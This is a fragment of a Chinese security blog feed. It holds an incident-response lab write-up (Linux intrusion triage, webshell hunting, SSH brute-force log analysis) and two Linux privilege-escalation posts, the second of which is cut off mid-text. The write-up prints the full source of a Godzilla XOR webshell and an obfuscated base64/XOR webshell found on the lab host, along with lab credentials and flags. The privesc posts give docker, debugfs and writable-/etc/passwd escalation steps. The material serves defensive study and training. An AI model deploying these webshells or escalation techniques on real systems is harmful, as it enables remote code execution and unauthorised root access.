invoke__">usleep</span>(<span class="hljs-number">3000</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>黑客留了一个木马文件，就是<strong>shell(1).elf</strong>文件</p><p><img src="http://cdn.clown2024.cn/202407151645938.png" alt="image-20240709113120553"></p><p>可以看到没有可执行权限，这里加一个权限，然后开另一个端口查看端口情况</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 shell\(1\).elf<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645939.png" alt="image-20240709113441330"></p><p>最后可以看到其ip为<strong>10.11.55.21</strong>，端口为3333</p><p>最终的各个flag如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">flag&#123;1&#125;<br>flag&#123;hello&#125;<br>flag&#123;index.php&#125;<br>flag&#123;10.11.55.21&#125;<br>flag&#123;3333&#125;<br></code></pre></td></tr></table></figure><h2><span id="用工具的做法">用工具的做法</span></h2><p>用D盾来进行扫描,不过D盾没有Linux版本，所以需要通过将远程的Linux文件系统挂载到Windows上面，然后用D盾扫即可。</p><p>这里参考这篇文章来布置：<a href="https://developer.aliyun.com/article/1341008">https://developer.aliyun.com/article/1341008</a></p><p>采用的方法是<strong>winfsp + sshfs-win</strong>，这两个直接网上下载安装好即可：<a href="https://winfsp.dev/rel/">https://winfsp.dev/rel/</a></p><p>第一种方法是右击此电脑选择映射网络驱动器：</p><p><img src="http://cdn.clown2024.cn/202407151645940.png" alt="image-20240709122109922"></p><blockquote><p>或者输入sshfs.r，sshfs是挂载用户家目录，sshfs.r是挂载远程的根目录</p><p>点击完成后输入密码即可挂载</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151645941.png" alt="image-20240709122150458"></p><p>然后直接用D盾进行扫描web目录：</p><p><img src="http://cdn.clown2024.cn/202407151645942.png" alt="image-20240709122701725"></p><p>或者用sshfs-manage(sshfs的界面化工具，要单独再去下载)将Linux目录挂载到Windows，这里就懒得试了😥</p><p>还可以用net use命令挂载：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use              //列出所有网络连接<br>net use Z: /del      //删除本机映射的Z盘 <br>net use * /del /y    //删除所有映射和IPC$<br>net use Z: \\sshfs\root@192.168.1.120\/         //将对方根目录映射为Z盘<br>net use Z: \\sshfs.r\root@192.168.1.120         //将对方根目录映射为Z盘<br>net use Z: \\sshfs.r\root@192.168.1.120!1234    //将对方根目录映射为Z盘（其他端口）<br></code></pre></td></tr></table></figure><h1><span id="weshell查杀">weshell查杀</span></h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">靶机账号密码 root xjwebshell<br>1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;<br>2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;<br>3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx<br>4.黑客免杀马完整路径 md5 flag&#123;md5&#125;<br></code></pre></td></tr></table></figure><p>直接上D盾扫，用的还是上面的方法</p><p><img src="http://cdn.clown2024.cn/202407151645943.png" alt="image-20240709155032413"></p><p>先看一个简单的shell文件</p><p><img src="http://cdn.clown2024.cn/202407151645944.png" alt="image-20240709155214961"></p><p>这就是一个简单的webshell</p><p>再找找其他的，在gz.php找的的webshell比较特别</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-comment">//027ccd04-5065-48b6-a32d-77c704a5e26d</span><br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>!==<span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是第一个flag，flag{027ccd04-5065-48b6-a32d-77c704a5e26d}</p><p>然后就是看是什么类型的webshell，这里可以明显看到是哥斯拉的流量特征，是哥斯拉里面的一个异或加密脚本</p><p>哥斯拉的github地址：<a href="https://github.com/BeichenDream/Godzilla%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9B%E8%A1%8Cmd5%E5%B0%B1%E6%98%AFflag%EF%BC%8Cflag%7B39392de3218c333f794befef07ac9257%7D">https://github.com/BeichenDream/Godzilla，然后进行md5就是flag，flag{39392de3218c333f794befef07ac9257}</a></p><p>隐藏shell就是上面D盾查找出的.Mysqlli.php</p><p><img src="http://cdn.clown2024.cn/202407151645945.png" alt="image-20240709160839574"></p><p>也是一个哥斯拉的shell，路径就为：&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.php，flag为flag{aebac0e58cd6c5fad1695ee4d1ac1919}</p><p>最后一个是免杀马，这里静态检测就检测不到了，但是webshell执行的话会在日志留下记录，可以去日志里面看一看，Linux的日志在**&#x2F;var&#x2F;log**目录下</p><p>不过D盾已经把他扫出来了，就是top.php，我们也可以在日志access.log中看到他的记录</p><p><img src="http://cdn.clown2024.cn/202407151645946.png" alt="image-20240709161714553"></p><p>top.php内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;password&quot;</span>;<br><br><span class="hljs-comment">//ERsDHgEUC1hI</span><br><span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>]);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$fun</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">7</span>];<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;s&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$s</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func2&quot;</span>];<br><span class="hljs-variable">$c</span>(<span class="hljs-variable">$fun</span>);<br></code></pre></td></tr></table></figure><p>这里进行了混淆和加密，路径md5就是flag，flag{EEFF2EABFD9B7A6D26FC1A53D3F7D1DE}</p><p>参考文章：<a href="https://blog.csdn.net/administratorlws/article/details/139521078%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E6%89%8B%E5%B7%A5%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%8C%E6%80%BB%E7%BB%93%E4%BA%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81webshell%E7%89%B9%E5%BE%81">https://blog.csdn.net/administratorlws/article/details/139521078，里面有手工查杀的方式，总结了一些常见webshell特征</a></p><p>这里copy一些知识点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//各webshell的危险函数<br>PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()<br>ASP: Execute(), Eval(), CreateObject()<br>JSP: Runtime.getRuntime().exec()<br><br>//文件操作<br>PHP: fopen(), fwrite(), file_get_contents(), file_put_contents()<br>ASP: FileSystemObject<br><br>//网络操作<br>PHP: fsockopen(), curl_exec(), file_get_contents(&#x27;http://...&#x27;)<br>ASP: WinHttp.WinHttpRequest<br></code></pre></td></tr></table></figure><p>手工查杀免杀可以看他有没有编码函数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><h1><span id="linux日志分析">Linux日志分析</span></h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">账号root密码linuxrz<br>ssh root@IP<br>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割<br>2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割<br>3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割<br>4.登陆成功的IP共爆破了多少次<br>5.黑客登陆主机后新建了一个后门用户，用户名是多少<br></code></pre></td></tr></table></figure><p>首先查看有多少ip在爆破ssh的root账号那就去查看&#x2F;var&#x2F;log下的日志</p><p><img src="http://cdn.clown2024.cn/202407151645947.png" alt="image-20240709182756986"></p><p>看auth.log.1里面的登陆失败信息，这个是auth.log的归档文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>命令解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cat /var/log/auth.log.1：cat 命令用于连接文件并打印到标准输出设备，这里是用来显示 /var/log/auth.log.1 文件的内容。<br><br>grep -a &quot;Failed password for root&quot;：grep 命令用于搜索包含特定文本的行。这里搜索的是包含文本 &quot;Failed password for root&quot; 的行，表示 root 用户登录失败的事件。-a 选项是告诉 grep 以文本文件的方式处理二进制文件，保证输出的一致性。<br><br>awk &#x27;&#123;print $11&#125;&#x27;：awk 是一个强大的文本处理工具。这里 &#123;print $11&#125; 表示打印每行的第11个字段。在 auth.log 中，第11个字段通常是登录失败时尝试使用的用户名。<br><br>sort：sort 命令对输入的行进行排序。由于前面 awk 输出的是 root 用户的登录失败行，这里的 sort 将这些行进行字典序排序。<br><br>uniq -c：uniq 命令用于过滤掉排序后的重复行。-c 选项表示在每行前显示该行在文件中出现的次数。<br><br>sort -nr：再次使用 sort 命令，-n 选项表示按照数值排序，-r 选项表示降序排序。这里对 uniq 命令的输出结果按出现次数进行降序排序。<br><br>more：more 命令用于分页显示输出结果，允许用户逐步查看长输出，而不是一次性显示所有内容。<br></code></pre></td></tr></table></figure><p>可以找到3个ip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br>192.168.200.32<br>192.168.200.31<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645948.png" alt="image-20240709183107694"></p><p>爆破成功的用户就去查”Accepted”的字段</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Accepted&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645949.png" alt="image-20240709183249678"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br></code></pre></td></tr></table></figure><p>爆破用户命的字典就查”Failed password”字段</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs BASH"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password&quot;</span> |perl -e <span class="hljs-string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|<span class="hljs-built_in">uniq</span> -c|<span class="hljs-built_in">sort</span> -nr<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645950.png" alt="image-20240709183507195"></p><p>查找登录成功登陆的ip一共爆破了多少次，就查看”Failed password for root”字段，也就是第一个的查询，前面的数字就是登陆次数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>后门用户就查”new user”字段</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 |grep -a <span class="hljs-string">&quot;new user&quot;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645951.png" alt="image-20240709183835955"></p><p>也可以直接看&#x2F;etc&#x2F;passwd的内容</p><p><img src="http://cdn.clown2024.cn/202407151645952.png" alt="image-20240709183913790"></p><p>后门用户是test2</p><p><strong>来补充一下日志相关的知识</strong></p><p>参考这篇文章：<a href="https://developer.aliyun.com/article/1477704">https://developer.aliyun.com/article/1477704</a></p><p>上面查询的字段是日志的级别信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Invalid user 表示尝试使用了一个不存在的用户登录系统。<br>Failed password 表示为某个用户输入了错误的密码。<br>authentication failure 表示认证失败。<br>Connection closed 表示连接被关闭。<br>Accepted password 表示密码认证成功。<br>new user 或 new group 表示创建了新用户或新用户组。<br>password changed 表示用户密码被更改。<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;linux入侵排查&quot;&gt;Linux入侵排查&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;这是靶机的简介&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code clas</summary>
      
    
    
    
    <category term="应急响应wp" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94wp/"/>
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权-不安全配置项</title>
    <link href="https://clowsman.github.io/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/"/>
    <id>https://clowsman.github.io/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/</id>
    <published>2024-07-01T05:26:22.000Z</published>
    <updated>2024-08-05T15:42:00.397Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="不安全的用户组">不安全的用户组</span></h1><p><strong>disk用户组</strong></p><p>disk用户组是Linux中一个特殊的用户组，组内成员可以对一些块设备(比如硬盘、CD等)进行读写。如果属于disk用户组，就可以打开Linux的内置工具debugfs的交互式命令行，并可以挂载到文件系统来调试文件</p><p>先df命令查看文件系统磁盘信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span><br></code></pre></td></tr></table></figure><p>假设当前的目录分区为&#x2F;dev&#x2F;sda2，然后debugfs打开交互式命令行</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">debugfs /dev/sda2<br></code></pre></td></tr></table></figure><p>这时就可以对文件系统进行调试</p><p><strong>adm用户组</strong></p><p>此组的成员通常拥有读取和写入系统日志文件、查看系统性能指标以及执行其他系统管理任务的权限。可以查看&#x2F;var&#x2F;log下的目录系统敏感日志</p><p><strong>shadow用户组</strong></p><p>&#x2F;etc&#x2F;shadow用于存储用户密码，除了root用户，还有shadow用户组成员也可以查看该文件。</p><p><strong>lxd用户组</strong></p><p>改组成员可以使用Linux容器(LXD)。</p><p>Linux容器是一种轻量级的虚拟化技术，能够在单个Linux系统上运行多个独立的Linux实例。</p><p>用户所属该组时，可以使用lxc命令创建新容器，然后将宿主机的文件系统挂载至容器中，即可查看宿主机的敏感文件等操作</p><p><strong>Docker用户组</strong></p><p>Linux安装完docker之后会创建一个名为docker的用户组。如果属于这个组或者是root用户就可以使用docker命令尝试提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run -v /:/mnt -it alpine <span class="hljs-comment">#该命令用于将宿主机的根目录挂载到容器的/mnt目录下</span><br><span class="hljs-comment"># 执行这条命令时，docker检查是否存在alpine镜像，不存在会从docker hub中下载，然后以该镜像作为基础</span><br></code></pre></td></tr></table></figure><p>然后就可以在容器中访问宿主机的系统文件了</p><h1><span id="不安全的读写权限">不安全的读写权限</span></h1><p><strong>可写的&#x2F;etc&#x2F;passwd文件</strong></p><p>查看&#x2F;etc&#x2F;passwd的信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -lh /etc/passwd<br></code></pre></td></tr></table></figure><p>如果存在任意用户可以读写的情况，就可以生成用户信息添加到该文件中</p><p>执行下面命令生成带盐密码</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">perl -le <span class="hljs-string">&#x27;print crypt(&quot;123456&quot;,&quot;suiyi&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>可读的&#x2F;etc&#x2F;shadow文件</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;不安全的用户组&quot;&gt;不安全的用户组&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;disk用户组&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;disk用户组是Linux中一个特殊的用户组，组内成员可以对一些块设备(比如硬盘、CD等)进行读写。如果属于disk用户组，就</summary>
      
    
    
    
    <category term="Linux提权" scheme="https://clowsman.github.io/categories/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="Linux提权" scheme="https://clowsman.github.io/tags/Linux%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权-信息搜集</title>
    <link href="https://clowsman.github.io/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>https://clowsman.github.io/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2024-06-25T11:30:08.000Z</published>
    <updated>2024-07-15T07:11:59.488Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="服务器信息枚举">服务器信息枚举</span></h1><p><strong>判断是否虚拟化</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">systemd-detect-virt <span class="hljs-comment">#识别系统运行环境，看是否虚拟化</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511101.png" alt="image-20240625200028837"></p><p><strong>查找当前shell是否处于docker中</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;docker&#x27;</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><p><strong>查看系统信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a <span class="hljs-comment">#可以看到操作系统名称、版本、架构、主机名、内核版本信息等</span><br></code></pre></td></tr></table></figure><p><strong>查看内核版本信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -r<br></code></pre></td></tr></table></figure><p><strong>查看系统架构信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -m<br></code></pre></td></tr></table></figure><p><strong>查看发行版本信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/*-release<br></code></pre></td></tr></table></figure><p><strong>查看系统主机名信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hostname<br><span class="hljs-built_in">uname</span> -n<br></code></pre></td></tr></table></figure><h1><span id="用户信息枚举">用户信息枚举</span></h1><p><strong>查看当前用户</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><strong>查看当前用户详细信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span> <span class="hljs-comment">#包含用户名、用户ID和用户所属组及组ID</span><br></code></pre></td></tr></table></figure><p><strong>查看所有用户信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><strong>查看系统中所有用户组</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/group<br></code></pre></td></tr></table></figure><p><strong>查看id和对应组信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f1 /etc/passwd 2&gt;/dev/null);<span class="hljs-keyword">do</span> <span class="hljs-built_in">id</span> <span class="hljs-variable">$i</span>;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>查看当前登陆到系统的用户信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">w <span class="hljs-comment">#可以输出用户的登录名、所使用的终端、当前正在执行的命令、登陆时间和系统运行时间等信息</span><br></code></pre></td></tr></table></figure><p><strong>查看当前登陆的用户</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">users</span> <span class="hljs-comment">#仅会列出用户名</span><br></code></pre></td></tr></table></figure><p><strong>历史登陆信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">last<br></code></pre></td></tr></table></figure><p><strong>查找系统中所有超管用户</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep -v -E <span class="hljs-string">&quot;^#&quot;</span> /etc/passwd 2&gt;/dev/null | awk -F: <span class="hljs-string">&#x27;$3 == 0 &#123;print $1&#125;&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h1><span id="环境配置枚举">环境配置枚举</span></h1><ul><li>系统路径：PATH环境变量存储了系统中可执行文件的位置</li><li>用户信息：HOME环境变量存储了用户的家目录路径，USER环境变量存储了用户名</li><li>命令行选项：SHELL环境变量存储了用户的默认Shell程序的路径</li><li>其他信息：LANGUAGE环境变量存储了用户的默认语言环境</li></ul><p>环境变量配置不当可能导致权限提升</p><p><strong>查看系统环境变量</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> 2&gt;/dev/null | grep -v <span class="hljs-string">&#x27;LS_COLORS&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>查看可执行文件路径信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p><strong>查看用户环境配置文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/profile<br></code></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;profile是Linux的一个配置文件，包含了系统级别的配置信息；在启动时被读取，并设置系统的环境变量、用户变量、Shell选项等。profile还可以包含shell脚本用于执行一些初始化和配置工作</p><p><strong>查看可用Shell路径</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shells<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511102.png" alt="image-20240625202026353"></p><h1><span id="网络信息枚举">网络信息枚举</span></h1><p><strong>查看网络接口信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ifconfig -a<br>ip addr show<br></code></pre></td></tr></table></figure><p>还可以通过查看IP配置文件来查看网络接口信息</p><ul><li>Ubuntu18之前查看&#x2F;etc&#x2F;network&#x2F;interfaces文件</li><li>Ubuntu18之后查看&#x2F;etc&#x2F;netplan&#x2F;*.yaml</li><li>CentOS 8及之前查看&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-*文件</li><li>CentOS Stream 9查看&#x2F;etc&#x2F;NetworkManager&#x2F;system-connections&#x2F;下的文件</li></ul><p><strong>查看ARP缓存信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arp -a<br></code></pre></td></tr></table></figure><p><strong>查看路由信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">route<br></code></pre></td></tr></table></figure><p><strong>查看网络连接信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">netstat -antlp 2&gt;/dev/null <span class="hljs-comment">#查看所有网络连接信息</span><br>netstat -ntpl 2&gt;/dev/null <span class="hljs-comment">#查看正在监听的TCP端口</span><br>netstat -nupl 2&gt;/dev/null <span class="hljs-comment">#查看正在监听的UDP端口</span><br></code></pre></td></tr></table></figure><p><strong>查看DNS信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/resolv.conf <span class="hljs-comment">#查看该DNS配置文件，里面保存了本地系统用于域名解析的DNS服务器信息</span><br></code></pre></td></tr></table></figure><h1><span id="系统进程枚举">系统进程枚举</span></h1><p><strong>查看系统进程</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ps aux 2&gt;/dev/null<br>ps aux 2&gt;/dev/null | grep <span class="hljs-string">&#x27;root&#x27;</span> 2&gt;/dev/null <span class="hljs-comment">#查看以root权限运行的进程</span><br>ps aux 2&gt;/dev/null | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | xargs -r <span class="hljs-built_in">ls</span> -la 2&gt;/dev/null | awk <span class="hljs-string">&#x27;!x[$0]++&#x27;</span> 2&gt;/dev/null <span 